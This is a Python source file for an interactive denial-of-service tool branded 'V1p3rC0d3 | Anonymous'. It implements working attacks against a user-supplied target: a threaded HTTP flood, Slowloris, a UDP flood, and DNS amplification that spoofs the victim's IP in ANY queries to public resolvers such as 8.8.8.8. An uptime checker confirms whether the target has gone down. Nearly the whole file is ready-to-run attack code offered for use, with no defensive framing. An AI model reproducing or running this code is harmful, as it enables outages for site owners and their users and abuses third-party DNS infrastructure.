import sys, os, random, socket, threading, time, logging
import requests
from scapy.all import *
from datetime import datetime
try:
    import pyfiglet
except ImportError:
    pyfiglet = None

if os.geteuid() != 0:
    print("[!] This script requires root privileges (sudo)")
    sys.exit(1)

def print_banner():
    if pyfiglet:
        banner = pyfiglet.figlet_format("V1p3rC0d3 | Anonymous", font="slant")
        print(f"\033[95m{banner}\033[0m")
    else:
        print("=== V1p3rC0d3 | Anonymous ===")

logfile = "ddos_log.log"
logging.basicConfig(filename=logfile, level=logging.INFO,
                    format='%(asctime)s %(levelname)s: %(message)s')

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X)",
]

stats = {
    "requests_sent": 0,
    "requests_success": 0,
    "requests_failed": 0,
    "bytes_sent": 0,
    "start_time": None
}
stats_lock = threading.Lock()
stop_event = threading.Event()

def random_headers():
    return {"User-Agent": random.choice(USER_AGENTS), "Accept": "*/*"}

def print_stats():
    with stats_lock:
        duration = time.time() - stats["start_time"] if stats["start_time"] else 0.01
        rps = stats["requests_sent"] / duration
        print(f"\r[Stats] Sent: {stats['requests_sent']} | Success: {stats['requests_success']} | Fail: {stats['requests_failed']} | Rate: {rps:.2f} req/s", end='')

def log_and_update(success=True, bytes_sent=0):
    with stats_lock:
        stats["requests_sent"] += 1
        if success:
            stats["requests_success"] += 1
        else:
            stats["requests_failed"] += 1
        stats["bytes_sent"] += bytes_sent

def layer7_flood(target, threads, duration):
    def flood():
        timeout = time.time() + duration
        while time.time() < timeout and not stop_event.is_set():
            try:
                r = requests.get(target, headers=random_headers(), timeout=5)
                log_and_update(success=(r.status_code == 200), bytes_sent=len(r.content))
                logging.info(f"HTTP {r.status_code} {target}")
            except Exception as e:
                log_and_update(success=False)
                logging.error(f"HTTP Error: {e}")
    print(f"[+] Layer7 flood attack on {target} for {duration}s with {threads} threads")
    stats["start_time"] = time.time()
    threads_list = []
    for _ in range(threads):
        t = threading.Thread(target=flood)
        t.start()
        threads_list.append(t)
    for t in threads_list:
        t.join()

def slowloris(target, threads, duration):
    def slowloris_thread():
        timeout = time.time() + duration
        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((target, 80))
            s.send(f"GET /?{random.randint(0, 1000)} HTTP/1.1\r\n".encode())
            s.send(b"User-Agent: Mozilla/5.0\r\n")
            s.send(b"Accept-language: en-US,en,q=0.5\r\n")
            while time.time() < timeout and not stop_event.is_set():
                s.send(b"X-a: b\r\n")
                time.sleep(15)
            log_and_update(success=True)
        except Exception as e:
            log_and_update(success=False)
            logging.error(f"Slowloris Error: {e}")
        finally:
            if s:
                s.close()
    print(f"[+] Slowloris attack on {target} for {duration}s with {threads} threads")
    stats["start_time"] = time.time()
    threads_list = []
    for _ in range(threads):
        t = threading.Thread(target=slowloris_thread)
        t.start()
        threads_list.append(t)
    for t in threads_list:
        t.join()

def udp_flood(target_ip, target_port, threads, duration):
    packet = os.urandom(1024)
    def flood():
        timeout = time.time() + duration
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < timeout and not stop_event.is_set():
            try:
                sock.sendto(packet, (target_ip, target_port))
                log_and_update(success=True, bytes_sent=len(packet))
            except Exception as e:
                log_and_update(success=False)
                logging.error(f"UDP Flood Error: {e}")
        sock.close()
    print(f"[+] UDP flood attack on {target_ip}:{target_port} for {duration}s with {threads} threads")
    stats["start_time"] = time.time()
    threads_list = []
    for _ in range(threads):
        t = threading.Thread(target=flood)
        t.start()
        threads_list.append(t)
    for t in threads_list:
        t.join()

def dns_amplification(target_ip, threads, duration):
    # Use a large domain for amplification, e.g., "google.com"
    domain = "google.com"
    dns_servers = [
        "8.8.8.8", "8.8.4.4", "1.1.1.1", "9.9.9.9"
    ]
    def flood():
        timeout = time.time() + duration
        while time.time() < timeout and not stop_event.is_set():
            try:
                for dns_server in dns_servers:
                    # Spoof source IP as target_ip for amplification
                    packet = IP(src=target_ip, dst=dns_server)/UDP(sport=random.randint(1024, 65535), dport=53)/\
                        DNS(rd=1, qd=DNSQR(qname=domain, qtype="ANY"))
                    send(packet, verbose=0)
                log_and_update(success=True)
            except Exception as e:
                log_and_update(success=False)
                logging.error(f"DNS Amplification Error: {e}")
    print(f"[+] DNS amplification attack on {target_ip} for {duration}s with {threads} threads")
    stats["start_time"] = time.time()
    threads_list = []
    for _ in range(threads):
        t = threading.Thread(target=flood)
        t.start()
        threads_list.append(t)
    for t in threads_list:
        t.join()

def uptime_checker(target, interval=5):
    print("[*] Starting website uptime check (press CTRL+C to stop)...")
    try:
        while True:
            try:
                r = requests.get(target, timeout=3)
                if r.status_code == 200:
                    print(f"[UP] {datetime.now()} - {target} is online")
                else:
                    print(f"[DOWN?] {datetime.now()} - {target} returned status {r.status_code}")
            except:
                print(f"[DOWN] {datetime.now()} - {target} unreachable")
            time.sleep(interval)
    except KeyboardInterrupt:
        print("\n[*] Uptime checking stopped.")

def main():
    print_banner()
    target = input("Target (IP or URL): ").strip()
    try:
        threads = int(input("Number of threads (e.g., 100): "))
        duration = int(input("Attack duration (seconds): "))
    except:
        print("Invalid input!")
        return

    print("""
    Choose attack type:
    1) Layer7 HTTP Flood
    2) Slowloris
    3) UDP Flood (requires IP and port)
    4) DNS Amplification
    5) Website uptime checker (HTTP ping)
    """)

    choice = input("Option: ").strip()

    try:
        if choice == "1":
            layer7_flood(target, threads, duration)
        elif choice == "2":
            slowloris(target, threads, duration)
        elif choice == "3":
            port = int(input("UDP port: "))
            udp_flood(target, port, threads, duration)
        elif choice == "4":
            dns_amplification(target, threads, duration)
        elif choice == "5":
            uptime_checker(target)
            return
        else:
            print("Invalid option")
            return
    except KeyboardInterrupt:
        stop_event.set()
        print("\n[*] Attack stopped by user.")

    print("[*] Attack finished.")
    with stats_lock:
        duration = time.time() - stats["start_time"]
        print(f"--- Report ---")
        print(f"Attack duration: {duration:.2f} seconds")
        print(f"Requests sent: {stats['requests_sent']}")
        print(f"Successful requests: {stats['requests_success']}")
        print(f"Failed requests: {stats['requests_failed']}")
        print(f"Approx bytes sent: {stats['bytes_sent']}")
        logging.info(f"Attack finished after {duration:.2f}s. Sent: {stats['requests_sent']} Success: {stats['requests_success']} Fail: {stats['requests_failed']}")

if __name__ == "__main__":
    main()
